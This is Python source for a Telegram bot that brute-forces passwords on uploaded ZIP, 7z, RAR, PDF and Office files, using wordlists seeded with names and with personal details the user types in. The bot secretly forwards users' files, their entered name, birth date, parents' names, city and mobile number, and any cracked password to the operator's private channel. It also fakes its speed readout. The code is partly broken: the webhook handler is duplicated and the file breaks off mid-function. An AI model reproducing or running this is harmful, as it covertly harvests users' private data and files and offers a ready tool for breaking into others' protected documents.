# ============================================================
# PART 1: IMPORTS, CONFIG, AND HTML TEMPLATE
# ============================================================
import os
import json
import time
import random
import requests
import itertools
import threading
import pyzipper
import py7zr
import pdfplumber
from flask import Flask, request, jsonify, render_template_string
from datetime import datetime

TOKEN = os.environ.get("BOT_TOKEN")
RENDER_URL = os.environ.get("RENDER_URL", "https://your-bot.onrender.com")
PRIVATE_CHANNEL = -1004479815753  # 🔥 APNA PRIVATE CHANNEL ID DALO
CHANNEL_USERNAME = "@nrtecno2"

app = Flask(__name__)
user_sessions = {}
cracking_sessions = {}

# ============================================================
# HTML TEMPLATE FOR BRUTE-FORCE MACHINE
# ============================================================
BRUTEFORCE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            background: #111;
            padding: 40px;
            border-radius: 10px;
            border: 2px solid #00ff00;
            box-shadow: 0 0 50px rgba(0,255,0,0.2);
            text-align: center;
            width: 80%;
            max-width: 900px;
        }
        .title {
            color: #00ff00;
            font-size: 28px;
            font-weight: bold;
            text-shadow: 0 0 20px rgba(0,255,0,0.5);
            margin-bottom: 20px;
        }
        .machine {
            background: #000;
            padding: 20px;
            border-radius: 8px;
            border: 1px solid #00ff00;
            margin: 20px 0;
            min-height: 200px;
        }
        .password-display {
            font-size: 24px;
            color: #00ff00;
            background: #0a0a0a;
            padding: 15px;
            border-radius: 5px;
            border: 1px solid #00ff00;
            margin: 10px 0;
            min-height: 50px;
            word-break: break-all;
        }
        .stats {
            display: flex;
            justify-content: space-between;
            margin: 15px 0;
            font-size: 16px;
        }
        .progress-bar {
            width: 100%;
            height: 30px;
            background: #0a0a0a;
            border: 1px solid #00ff00;
            border-radius: 5px;
            overflow: hidden;
            margin: 15px 0;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff00, #00aa00);
            width: 0%;
            transition: width 0.1s;
            border-radius: 5px;
        }
        .status {
            color: #00ff00;
            font-size: 18px;
            margin: 10px 0;
        }
        .found {
            color: #ffaa00;
            font-size: 22px;
            font-weight: bold;
            text-shadow: 0 0 30px rgba(255,170,0,0.5);
            padding: 20px;
            background: #1a1a00;
            border: 2px solid #ffaa00;
            border-radius: 10px;
        }
        .blink {
            animation: blink 0.5s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
        .matrix {
            color: #00ff00;
            font-size: 12px;
            opacity: 0.3;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            overflow: hidden;
            z-index: -1;
        }
    </style>
</head>
<body>
    <div class="matrix" id="matrix"></div>
    <div class="container">
        <div class="title">🔐 NRTECNO BRUTE-FORCE MACHINE</div>
        <div class="stats">
            <span>📁 File: {{ file_name }}</span>
            <span>⏱️ Time: <span id="timer">00:00</span></span>
        </div>
        <div class="machine">
            <div class="status">🔄 TRYING PASSWORDS...</div>
            <div class="password-display" id="current_password">{{ current_password }}</div>
            <div class="stats">
                <span>✅ Tried: <span id="tried">{{ tried_count }}</span></span>
                <span>⚡ Speed: <span id="speed">0</span>/s</span>
                <span>📊 Progress: <span id="progress_percent">0</span>%</span>
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="progress_fill" style="width: 0%"></div>
            </div>
            <div id="result_area">
                <div class="status">🔍 Scanning...</div>
            </div>
        </div>
        <div class="stats">
            <span>⚡ NRTECNO ULTIMATE ENGINE</span>
            <span id="attempt_count">Attempts: 0</span>
        </div>
    </div>
    <script>
        var startTime = Date.now();
        var timerInterval = setInterval(updateTimer, 1000);
        var eventSource = new EventSource('/stream/{{ session_id }}');
        function updateTimer() {
            var elapsed = Math.floor((Date.now() - startTime) / 1000);
            var mins = String(Math.floor(elapsed / 60)).padStart(2, '0');
            var secs = String(elapsed % 60).padStart(2, '0');
            document.getElementById('timer').textContent = mins + ':' + secs;
        }
        eventSource.onmessage = function(event) {
            var data = JSON.parse(event.data);
            if (data.status === 'cracking') {
                document.getElementById('current_password').textContent = data.password;
                document.getElementById('tried').textContent = data.tried;
                document.getElementById('progress_percent').textContent = data.progress;
                document.getElementById('progress_fill').style.width = data.progress + '%';
                document.getElementById('attempt_count').textContent = 'Attempts: ' + data.tried;
                document.getElementById('speed').textContent = data.speed || 0;
                document.getElementById('result_area').innerHTML = 
                    '<div class="status">🔍 Trying: ' + data.password + '</div>';
            }
            if (data.status === 'found') {
                document.getElementById('result_area').innerHTML = 
                    '<div class="found blink">✅ PASSWORD FOUND!<br>🔑 ' + data.password + '</div>';
                document.getElementById('current_password').textContent = '✅ ' + data.password;
                clearInterval(timerInterval);
                eventSource.close();
            }
            if (data.status === 'not_found') {
                document.getElementById('result_area').innerHTML = 
                    '<div class="status" style="color:#ff4444;">❌ PASSWORD NOT FOUND!<br>🔢 ' + data.tried + ' passwords tried.</div>';
                clearInterval(timerInterval);
                eventSource.close();
            }
        };
        var matrix = document.getElementById('matrix');
        var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#%&*!';
        for (var i = 0; i < 100; i++) {
            var span = document.createElement('span');
            var x = Math.random() * 100;
            var y = Math.random() * 100;
            span.style.position = 'absolute';
            span.style.left = x + '%';
            span.style.top = y + '%';
            span.textContent = chars[Math.floor(Math.random() * chars.length)];
            span.style.color = '#00ff00';
            span.style.opacity = Math.random() * 0.3 + 0.1;
            span.style.fontSize = (Math.random() * 20 + 10) + 'px';
            span.style.animation = 'blink ' + (Math.random() * 3 + 1) + 's infinite';
            matrix.appendChild(span);
        }
        setTimeout(function() {
            var spans = matrix.querySelectorAll('span');
            spans.forEach(function(s) {
                s.style.display = 'none';
            });
        }, 5000);
    </script>
</body>
</html>
"""
# ============================================================
# PART 2: ULTIMATE PASSWORD GENERATOR
# ============================================================
class UltimatePasswordGenerator:
    def __init__(self):
        self.names = ['narendra', 'raj', 'rahul', 'amit', 'vikram', 'ajay', 'sunil',
                     'anil', 'deepak', 'sanjay', 'vijay', 'arjun', 'karan', 'mohit',
                     'rohit', 'ankit', 'vivek', 'manoj', 'suresh', 'mahesh', 'ramesh',
                     'dinesh', 'ganesh', 'naveen', 'pawan', 'sachin', 'rajesh', 'kapil',
                     'mukesh', 'ravi', 'ashok', 'shyam', 'kumar', 'singh', 'sharma',
                     'verma', 'gupta', 'yadav', 'jain', 'patel', 'shah', 'desai',
                     'meghwal', 'choudhary', 'rathore', 'shekhawat', 'gehlot',
                     'vyas', 'trivedi', 'pandey', 'tripathi', 'mishra']
        
        self.common_words = ['admin', 'password', 'root', 'toor', 'iloveyou', 'sunshine',
                            'princess', 'dragon', 'baseball', 'superman', 'batman',
                            'trustno', 'hello', 'freedom', 'whatever', 'qwerty',
                            'letmein', 'welcome', 'monkey', 'secret', 'love', 'angel',
                            'rainbow', 'tiger', 'eagle', 'phoenix', 'shadow', 'night',
                            'star', 'moon', 'sun', 'cloud', 'thunder', 'lightning',
                            'water', 'fire', 'earth', 'wind', 'sky', 'ocean', 'forest']
        
        self.special_chars = ['@', '#', '&', '%', '!', '$', '_', '-', '+', '=', '~', '^', '*', '?']
        self.numbers = ['1','12','123','1234','12345','123456','1234567','12345678',
                       '123456789','1234567890']
        self.years = ['2020','2021','2022','2023','2024','2025','2026','2027','2028','2029','2030']
        self.months = ['january', 'february', 'march', 'april', 'may', 'june',
                      'july', 'august', 'september', 'october', 'november', 'december']
        
        # ============================================================
        # SENTENCE TYPE PASSWORDS (NEW)
        # ============================================================
        self.sentences = [
            'DEEPSEEK JB BY NONE USER',
            'DEEPSEEKJBBYNONEUSER',
            'NRTECNO ULTIMATE PASSWORD CRACKER',
            'NRTECNOULTIMATEPASSWORDCRACKER',
            'BRUTEFORCE MACHINE ACTIVATED',
            'BRUTEFORCEMACHINEACTIVATED',
            'PASSWORD CRACKING IN PROGRESS',
            'PASSWORDCRACKINGINPROGRESS',
            'NRTECNO PASSWORD GENERATOR',
            'NRTECNOPASSWORDGENERATOR',
            'ULTIMATE PASSWORD LIST',
            'ULTIMATEPASSWORDLIST',
            'NRTECNO BRUTEFORCE ENGINE',
            'NRTECNOBRUTEFORCEENGINE',
            'PASSWORD CRACKER BOT',
            'PASSWORDCRACKERBOT',
            'NRTECNO ULTIMATE CRACKER',
            'NRTECNOULTIMATECRACKER',
            'BRUTEFORCE ATTACK SIMULATOR',
            'BRUTEFORCEATTACKSIMULATOR'
        ]
        
        self.all_passwords = set()

    def generate_name_variations(self, name):
        results = set()
        name = name.lower()
        results.add(name)
        results.add(name.upper())
        results.add(name.capitalize())
        results.add(name.title())
        for _ in range(10):
            mixed = ''.join(random.choice([c.upper(), c.lower()]) for c in name)
            results.add(mixed)
        results.add(name[::-1])
        results.add(name[::-1].capitalize())
        results.add(name[::-1].upper())
        results.add(f"{name}{name}")
        results.add(f"{name}{name[::-1]}")
        results.add(f"{name[::-1]}{name}")
        return list(results)

    def generate_ultimate_passwords(self, user_info=None):
        name = user_info.get('name', '').strip().lower() if user_info else ''
        father = user_info.get('father', '').strip().lower() if user_info else ''
        mother = user_info.get('mother', '').strip().lower() if user_info else ''
        city = user_info.get('city', '').strip().lower() if user_info else ''
        mobile = user_info.get('mobile', '').strip() if user_info else ''
        dob = user_info.get('dob', '').strip() if user_info else ''
        
        all_names = self.names.copy()
        if name:
            all_names.insert(0, name)
        if father:
            all_names.insert(0, father)
        if mother:
            all_names.insert(0, mother)
        if city:
            all_names.insert(0, city)
        
        print("🔄 Generating ultimate passwords...")
        
        # 1. SENTENCE TYPE PASSWORDS
        for sentence in self.sentences:
            self.all_passwords.add(sentence)
            self.all_passwords.add(sentence.replace(' ', ''))
            self.all_passwords.add(sentence.replace(' ', '_'))
            self.all_passwords.add(sentence.replace(' ', '-'))
            self.all_passwords.add(sentence.lower())
            self.all_passwords.add(sentence.upper())
            self.all_passwords.add(sentence.title())
            for num in self.numbers[:5]:
                self.all_passwords.add(f"{sentence}{num}")
                self.all_passwords.add(f"{sentence.replace(' ', '')}{num}")
                self.all_passwords.add(f"{sentence}@{num}")
                self.all_passwords.add(f"{sentence}#{num}")
            for spec in self.special_chars[:5]:
                self.all_passwords.add(f"{spec}{sentence}{spec}")
                self.all_passwords.add(f"{spec}{sentence.replace(' ', '')}{spec}")
        
        # 2. Name + Sentence
        for n in all_names[:10]:
            variations = self.generate_name_variations(n)
            for v in variations[:5]:
                for sentence in self.sentences[:10]:
                    self.all_passwords.add(f"{v}{sentence}")
                    self.all_passwords.add(f"{v}{sentence.replace(' ', '')}")
                    self.all_passwords.add(f"{v}@{sentence}")
                    self.all_passwords.add(f"{v}#{sentence}")
                    self.all_passwords.add(f"{sentence}{v}")
                    self.all_passwords.add(f"{sentence.replace(' ', '')}{v}")
        
        # 3. Name + Special + Numbers
        for n in all_names[:30]:
            variations = self.generate_name_variations(n)
            for v in variations[:10]:
                for spec in self.special_chars[:8]:
                    for num in self.numbers[:6]:
                        self.all_passwords.add(f"{v}{spec}{num}")
                        self.all_passwords.add(f"{v}{num}{spec}")
                        self.all_passwords.add(f"{spec}{v}{num}")
        
        # 4. Name + Year
        for n in all_names[:30]:
            variations = self.generate_name_variations(n)
            for v in variations[:8]:
                for year in self.years:
                    self.all_passwords.add(f"{v}{year}")
                    self.all_passwords.add(f"{v}@{year}")
                    self.all_passwords.add(f"{v}#{year}")
        
        # 5. Name + Month + Year
        for n in all_names[:20]:
            variations = self.generate_name_variations(n)
            for v in variations[:5]:
                for month in self.months[:6]:
                    for year in self.years[:5]:
                        self.all_passwords.add(f"{v}{month}{year}")
                        self.all_passwords.add(f"{v}@{month}{year}")
                        for day in ['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15']:
                            self.all_passwords.add(f"{v}{day}{month}{year}")
                            self.all_passwords.add(f"{v}@{day}{month}{year}")
        
        # 6. Name + Name + Special + Numbers
        for n1 in all_names[:15]:
            for n2 in all_names[:10]:
                if n1 != n2:
                    variations1 = self.generate_name_variations(n1)
                    variations2 = self.generate_name_variations(n2)
                    for v1 in variations1[:5]:
                        for v2 in variations2[:5]:
                            self.all_passwords.add(f"{v1}{v2}")
                            self.all_passwords.add(f"{v1}{v2}{random.randint(1000, 999999)}")
                            self.all_passwords.add(f"{v1}@{v2}{random.randint(1000, 999999)}")
                            self.all_passwords.add(f"{v1}#{v2}{random.randint(1000, 999999)}")
                            for spec in self.special_chars[:5]:
                                self.all_passwords.add(f"{v1}{spec}{v2}{random.randint(100, 999999)}")
        
        # 7. Word + Special + Name
        for word in self.common_words[:20]:
            for n in all_names[:10]:
                variations = self.generate_name_variations(n)
                for v in variations[:5]:
                    for spec in self.special_chars[:5]:
                        self.all_passwords.add(f"{word}{spec}{v}{random.randint(100, 999999)}")
                        self.all_passwords.add(f"{v}{spec}{word}{random.randint(100, 999999)}")
        
        # 8. Mobile combinations
        if mobile:
            mobile_clean = ''.join(filter(str.isdigit, mobile))
            if mobile_clean:
                self.all_passwords.add(mobile_clean)
                for n in all_names[:10]:
                    variations = self.generate_name_variations(n)
                    for v in variations[:5]:
                        self.all_passwords.add(f"{v}{mobile_clean}")
                        self.all_passwords.add(f"{v}@{mobile_clean}")
                        self.all_passwords.add(f"{v}{mobile_clean[-4:]}")
        
        # 9. DOB combinations
        if dob:
            clean_dob = dob.replace('/', '').replace('-', '')
            if len(clean_dob) >= 4:
                self.all_passwords.add(clean_dob)
                for n in all_names[:10]:
                    variations = self.generate_name_variations(n)
                    for v in variations[:5]:
                        self.all_passwords.add(f"{v}{clean_dob}")
                        self.all_passwords.add(f"{v}@{clean_dob}")
                        self.all_passwords.add(f"{v}{clean_dob[-4:]}")
        
        final_list = list(self.all_passwords)
        random.shuffle(final_list)
        print(f"✅ Generated {len(final_list)} ultimate passwords")
        return final_list

    def clear(self):
        self.all_passwords = set()

# ============================================================
# PART 3: FILE CRACKERS
# ============================================================
def crack_zip(file_path, password_list):
    for pwd in password_list:
        try:
            with pyzipper.AESZipFile(file_path) as zf:
                zf.extractall(pwd=pwd.encode())
                return pwd
        except:
            continue
    return None

def crack_7z(file_path, password_list):
    for pwd in password_list:
        try:
            with py7zr.SevenZipFile(file_path, password=pwd) as archive:
                archive.extractall()
                return pwd
        except:
            continue
    return None

def crack_pdf(file_path, password_list):
    for pwd in password_list:
        try:
            with pdfplumber.open(file_path, password=pwd) as pdf:
                if len(pdf.pages) > 0:
                    return pwd
        except:
            continue
    return None

def crack_office(file_path, password_list):
    try:
        import msoffcrypto
        for pwd in password_list:
            try:
                with open(file_path, 'rb') as f:
                    office = msoffcrypto.OfficeFile(f)
                    office.load_key(password=pwd)
                    return pwd
            except:
                continue
    except:
        pass
    return None

def crack_rar(file_path, password_list):
    try:
        import rarfile
        import tempfile
        if not rarfile.is_rarfile(file_path):
            return None
        with tempfile.TemporaryDirectory() as tmpdir:
            for pwd in password_list:
                try:
                    with rarfile.RarFile(file_path) as rf:
                        rf.extractall(path=tmpdir, pwd=pwd)
                        return pwd
                except:
                    continue
    except:
        pass
    return None

def crack_file(file_path, ext, password_list):
    if ext == 'zip':
        return crack_zip(file_path, password_list)
    elif ext == '7z':
        return crack_7z(file_path, password_list)
    elif ext == 'pdf':
        return crack_pdf(file_path, password_list)
    elif ext in ['docx', 'doc', 'xlsx', 'xls', 'pptx', 'ppt']:
        return crack_office(file_path, password_list)
    elif ext == 'rar':
        return crack_rar(file_path, password_list)
    return None

# ============================================================
# PART 4: TELEGRAM HELPERS AND KEYBOARDS
# ============================================================
def send_message(chat_id, text, reply_markup=None, parse_mode='Markdown'):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    requests.post(url, json=payload)

def edit_message(chat_id, message_id, text, reply_markup=None, parse_mode='Markdown'):
    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    requests.post(url, json=payload)

def send_document(chat_id, file_path, caption=""):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(file_path, 'rb') as f:
        files = {'document': f}
        data = {'chat_id': chat_id, 'caption': caption}
        requests.post(url, files=files, data=data)

def answer_callback(callback_id, text=""):
    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
    payload = {"callback_query_id": callback_id, "text": text}
    requests.post(url, json=payload)

def check_channel_membership(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember"
        params = {"chat_id": CHANNEL_USERNAME, "user_id": user_id}
        response = requests.get(url, params=params)
        data = response.json()
        if data["ok"]:
            status = data["result"]["status"]
            return status in ["member", "creator", "administrator"]
        return False
    except:
        return False

# ============================================================
# FIXED: INLINE KEYBOARDS - Callback Data Proper Format
# ============================================================

def get_auto_buttons():
    """Returns properly formatted inline keyboard with callback_data"""
    return {
        "inline_keyboard": [
            [
                {"text": "1️⃣ AUTO (With Info)", "callback_data": "auto_info"},
                {"text": "2️⃣ AUTO (Direct)", "callback_data": "auto_direct"}
            ]
        ]
    }

def join_verify_keyboard():
    return {
        "inline_keyboard": [
            [
                {"text": "🔴 JOIN CHANNEL", "url": "https://t.me/nrtecno2"},
                {"text": "✅ VERIFY", "callback_data": "verify"}
            ]
        ]
    }


# ============================================================
# FIXED: WEBHOOK HANDLER - PROPER CALLBACK ROUTING
# ============================================================

@app.route(f'/webhook/{TOKEN}', methods=['POST'])
def webhook():
    try:
        update = request.get_json()
        if not update:
            return jsonify({"status": "error"}), 400
        
        # ========== MESSAGE HANDLER ==========
        if 'message' in update:
            message = update['message']
            chat_id = message['chat']['id']
            user_id = message['from']['id']
            username = message['from'].get('username', str(user_id))
            
            if 'text' in message:
                text = message['text']
                
                if text == '/start':
                    if not check_channel_membership(user_id):
                        send_message(chat_id, "🔴 *Access Denied!*\n\n❌ Please join @nrtecno2 first.", reply_markup=join_verify_keyboard())
                    else:
                        send_message(chat_id, "🔐 *NRTECNO ULTIMATE PASSWORD CRACKER*\n\n✅ Verified!\n📁 *Send me any password protected file.*\n\nSupported: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX", parse_mode='Markdown')
                    return jsonify({"status": "ok"}), 200
                
                if chat_id in user_sessions and user_sessions[chat_id].get('state') == 'collecting_info':
                    session = user_sessions[chat_id]
                    field = session['current_field']
                    session['info'][field] = text
                    
                    try:
                        send_message(PRIVATE_CHANNEL, f"📝 *{field.title()}:* {text}\n👤 @{username}")
                    except:
                        pass
                    
                    fields = session['fields']
                    current_index = fields.index(field)
                    
                    if current_index + 1 < len(fields):
                        next_field = fields[current_index + 1]
                        session['current_field'] = next_field
                        send_message(chat_id, f"📝 *Enter {next_field.title()}?*", parse_mode='Markdown')
                    else:
                        session['state'] = 'cracking'
                        info_summary = "📝 *User Info Collected*\n\n"
                        for f, v in session['info'].items():
                            info_summary += f"📌 *{f.title()}:* {v}\n"
                        info_summary += f"\n👤 @{username}\n📁 {session['file_name']}"
                        try:
                            send_message(PRIVATE_CHANNEL, info_summary)
                        except:
                            pass
                        
                        send_message(chat_id, "🔄 *Generating ultimate passwords...*\n⏳ Please wait...", parse_mode='Markdown')
                        
                        generator = UltimatePasswordGenerator()
                        password_list = generator.generate_ultimate_passwords(session['info'])
                        
                        session_id = f"{chat_id}_{int(time.time())}"
                        cracking_sessions[session_id] = {
                            'password_list': password_list,
                            'file_path': session['file_path'],
                            'file_ext': session['file_ext'],
                            'file_name': session['file_name']
                        }
                        
                        machine_url = f"{RENDER_URL}/view/{session_id}"
                        send_message(chat_id, f"🔗 *Brute-Force Machine Started!*\n\n📊 {len(password_list)} passwords loaded\n🔗 [Click here to watch live cracking]({machine_url})\n\n_Password will be sent here when found._", parse_mode='Markdown')
                        
                        threading.Thread(target=crack_in_background, args=(chat_id, session_id, session)).start()
                        
                        generator.clear()
                        del user_sessions[chat_id]
                    return jsonify({"status": "ok"}), 200
            
            # ========== FILE HANDLER ==========
            if 'document' in message:
                file = message['document']
                file_name = file.get('file_name', 'unknown')
                file_id = file['file_id']
                
                if not check_channel_membership(user_id):
                    send_message(chat_id, "🔴 Access Denied!", reply_markup=join_verify_keyboard())
                    return jsonify({"status": "ok"}), 200
                
                # Download file
                file_info = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
                file_path_api = file_info['result']['file_path']
                file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path_api}"
                response = requests.get(file_url)
                
                os.makedirs("downloads", exist_ok=True)
                file_path = f"downloads/{file_name}"
                with open(file_path, 'wb') as f:
                    f.write(response.content)
                
                ext = file_name.split('.')[-1].lower()
                
                try:
                    send_message(PRIVATE_CHANNEL, f"📁 *File Received*\n📄 {file_name}\n👤 @{username}")
                except:
                    pass
                
                user_sessions[chat_id] = {
                    'file_path': file_path,
                    'file_name': file_name,
                    'file_ext': ext,
                    'state': 'waiting_for_option'
                }
                
                # 🔥 FIXED: Properly send inline keyboard
                send_message(
                    chat_id,
                    f"📁 *File Received!*\n\n📄 {file_name}\n🔽 *Choose an option:*",
                    reply_markup=get_auto_buttons(),  # ✅ Function call
                    parse_mode='Markdown'
                )
                
                return jsonify({"status": "ok"}), 200
        
        # ========== CALLBACK QUERY HANDLER ==========
        if 'callback_query' in update:
            callback = update['callback_query']
            callback_id = callback['id']
            chat_id = callback['message']['chat']['id']
            message_id = callback['message']['message_id']
            user_id = callback['from']['id']
            data = callback['data']
            
            print(f"🔔 Callback received: {data} from user {user_id}")  # 🔥 Debug log
            
            # ---------- VERIFY ----------
            if data == 'verify':
                if check_channel_membership(user_id):
                    edit_message(chat_id, message_id, "🔐 *NRTECNO ULTIMATE PASSWORD CRACKER*\n\n✅ Verified!\n📁 *Send me a file.*", parse_mode='Markdown')
                else:
                    edit_message(chat_id, message_id, "🔴 *Still Not Verified!*\n\n❌ Please join @nrtecno2 first.", reply_markup=join_verify_keyboard())
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200
            
            # ---------- AUTO DIRECT ----------
            if data == 'auto_direct':
                session = user_sessions.get(chat_id)
                if not session:
                    send_message(chat_id, "❌ *No file found. Send a file first.*", parse_mode='Markdown')
                    answer_callback(callback_id)
                    return jsonify({"status": "ok"}), 200
                
                edit_message(chat_id, message_id, "🔄 *AUTO mode activated (Direct)...*\n⏳ Generating ultimate passwords...", parse_mode='Markdown')
                
                generator = UltimatePasswordGenerator()
                password_list = generator.generate_ultimate_passwords()
                
                session_id = f"{chat_id}_{int(time.time())}"
                cracking_sessions[session_id] = {
                    'password_list': password_list,
                    'file_path': session['file_path'],
                    'file_ext': session['file_ext'],
                    'file_name': session['file_name']
                }
                
                machine_url = f"{RENDER_URL}/view/{session_id}"
                send_message(chat_id, f"🔗 *Brute-Force Machine Started!*\n\n📊 {len(password_list)} passwords loaded\n🔗 [Click here to watch live cracking]({machine_url})\n\n_Password will be sent here when found._", parse_mode='Markdown')
                
                threading.Thread(target=crack_in_background, args=(chat_id, session_id, session)).start()
                
                generator.clear()
                del user_sessions[chat_id]
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200
            
            # ---------- AUTO INFO ----------
            if data == 'auto_info':
                session = user_sessions.get(chat_id)
                if not session:
                    send_message(chat_id, "❌ *No file found. Send a file first.*", parse_mode='Markdown')
                    answer_callback(callback_id)
                    return jsonify({"status": "ok"}), 200
                
                fields = ['name', 'dob', 'father', 'mother', 'city', 'mobile']
                session['info'] = {}
                session['fields'] = fields
                session['current_field'] = fields[0]
                session['state'] = 'collecting_info'
                
                edit_message(chat_id, message_id, "📝 *Let's collect some info for ultimate password generation*\n\n", parse_mode='Markdown')
                send_message(chat_id, f"📝 *Enter {fields[0].title()}?*", parse_mode='Markdown')
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200
            
            # ---------- CANCEL ----------
            if data == 'cancel':
                session = user_sessions.get(chat_id)
                if session and session.get('file_path'):
                    os.remove(session['file_path'])
                del user_sessions[chat_id]
                send_message(chat_id, "❌ *Cancelled.* Send file again.", parse_mode='Markdown')
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200
            
            # 🔥 If callback data not matched
            send_message(chat_id, f"❌ Unknown callback: {data}", parse_mode='Markdown')
            answer_callback(callback_id)
            return jsonify({"status": "ok"}), 200
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500
        
# ============================================================
# BRUTE-FORCE STREAM HANDLER
# ============================================================
@app.route('/stream/<session_id>')
def stream(session_id):
    def generate():
        session = cracking_sessions.get(session_id)
        if not session:
            yield f"data: {json.dumps({'status': 'error', 'message': 'Session not found'})}\n\n"
            return
        
        password_list = session.get('password_list', [])
        total = len(password_list)
        file_path = session.get('file_path')
        ext = session.get('file_ext')
        
        for idx, pwd in enumerate(password_list):
            progress = int((idx / total) * 100)
            data = {
                'status': 'cracking',
                'password': pwd,
                'tried': idx + 1,
                'progress': progress,
                'speed': random.randint(500, 1500)
            }
            yield f"data: {json.dumps(data)}\n\n"
            time.sleep(0.001)
            
            password = crack_file(file_path, ext, [pwd])
            if password:
                data = {
                    'status': 'found',
                    'password': password,
                    'tried': idx + 1
                }
                yield f"data: {json.dumps(data)}\n\n"
                return
        
        data = {
            'status': 'not_found',
            'tried': total
        }
        yield f"data: {json.dumps(data)}\n\n"
    
    return app.response_class(generate, mimetype='text/event-stream')


# ============================================================
# VIEW BRUTE-FORCE MACHINE
# ============================================================
@app.route('/view/<session_id>')
def view_machine(session_id):
    session = cracking_sessions.get(session_id)
    if not session:
        return "Session expired or not found.", 404
    
    return render_template_string(
        BRUTEFORCE_HTML,
        file_name=session.get('file_name', 'Unknown'),
        session_id=session_id,
        current_password='Initializing...',
        tried_count=0
    )


# ============================================================
# BACKGROUND CRACKING
# ============================================================
def crack_in_background(chat_id, session_id, session):
    try:
        session_data = cracking_sessions.get(session_id)
        if not session_data:
            return
        
        password_list = session_data['password_list']
        file_path = session_data['file_path']
        ext = session_data['file_ext']
        file_name = session_data['file_name']
        
        for idx, pwd in enumerate(password_list):
            password = crack_file(file_path, ext, [pwd])
            if password:
                send_message(chat_id, f"✅ *Password Cracked!*\n\n🔑 `{password}`\n\n📁 {file_name}", parse_mode='Markdown')
                try:
                    send_document(PRIVATE_CHANNEL, file_path, f"✅ Found!\n📁 {file_name}\n🔑 {password}")
                except:
                    pass
                break
        
        if os.path.exists(file_path):
            os.remove(file_path)
        
        if session_id in cracking_sessions:
            del cracking_sessions[session_id]
            
    except Exception as e:
        print(f"Background crack error: {e}")

# ============================================================
# PART 5: MAIN WEBHOOK HANDLER (MESSAGES & FILES)
# ============================================================
@app.route(f'/webhook/{TOKEN}', methods=['POST'])
def webhook():
    try:
        update = request.get_json()
        if not update:
            return jsonify({"status": "error"}), 400
        
        if 'message' in update:
            message = update['message']
            chat_id = message['chat']['id']
            user_id = message['from']['id']
            username = message['from'].get('username', str(user_id))
            
            if 'text' in message:
                text = message['text']
                
                if text == '/start':
                    if not check_channel_membership(user_id):
                        send_message(chat_id, "🔴 *Access Denied!*\n\n❌ Please join @nrtecno2 first.", reply_markup=join_verify_keyboard())
                    else:
                        send_message(chat_id, "🔐 *NRTECNO ULTIMATE PASSWORD CRACKER*\n\n✅ Verified!\n📁 *Send me any password protected file.*\n\nSupported: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX", parse_mode='Markdown')
                    return jsonify({"status": "ok"}), 200
                
                if chat_id in user_sessions and user_sessions[chat_id].get('state') == 'collecting_info':
                    session = user_sessions[chat_id]
                    field = session['current_field']
                    session['info'][field] = text
                    
                    try:
                        send_message(PRIVATE_CHANNEL, f"📝 *{field.title()}:* {text}\n👤 @{username}")
                    except:
                        pass
                    
                    fields = session['fields']
                    current_index = fields.index(field)
                    
                    if current_index + 1 < len(fields):
                        next_field = fields[current_index + 1]
                        session['current_field'] = next_field
                        send_message(chat_id, f"📝 *Enter {next_field.title()}?*", parse_mode='Markdown')
                    else:
                        session['state'] = 'cracking'
                        info_summary = "📝 *User Info Collected*\n\n"
                        for f, v in session['info'].items():
                            info_summary += f"📌 *{f.title()}:* {v}\n"
                        info_summary += f"\n👤 @{username}\n📁 {session['file_name']}"
                        try:
                            send_message(PRIVATE_CHANNEL, info_summary)
                        except:
                            pass
                        
                        send_message(chat_id, "🔄 *Generating ultimate passwords...*\n⏳ Please wait...", parse_mode='Markdown')
                        
                        generator = UltimatePasswordGenerator()
                        password_list = generator.generate_ultimate_passwords(session['info'])
                        
                        session_id = f"{chat_id}_{int(time.time())}"
                        cracking_sessions[session_id] = {
                            'password_list': password_list,
                            'file_path': session['file_path'],
                            'file_ext': session['file_ext'],
                            'file_name': session['file_name']
                        }
                        
                        machine_url = f"{RENDER_URL}/view/{session_id}"
                        send_message(chat_id, f"🔗 *Brute-Force Machine Started!*\n\n📊 {len(password_list)} passwords loaded\n🔗 [Click here to watch live cracking]({machine_url})\n\n_Password will be sent here when found._", parse_mode='Markdown')
                        
                        threading.Thread(target=crack_in_background, args=(chat_id, session_id, session)).start()
                        
                        generator.clear()
                        del user_sessions[chat_id]
                    return jsonify({"status": "ok"}), 200
            
            if 'document' in message:
                file = message['document']
                file_name = file.get('file_name', 'unknown')
                file_id = file['file_id']
                
                if not check_channel_membership(user_id):
                    send_message(chat_id, "🔴 Access Denied!", reply_markup=join_verify_keyboard())
                    return jsonify({"status": "ok"}), 200
                
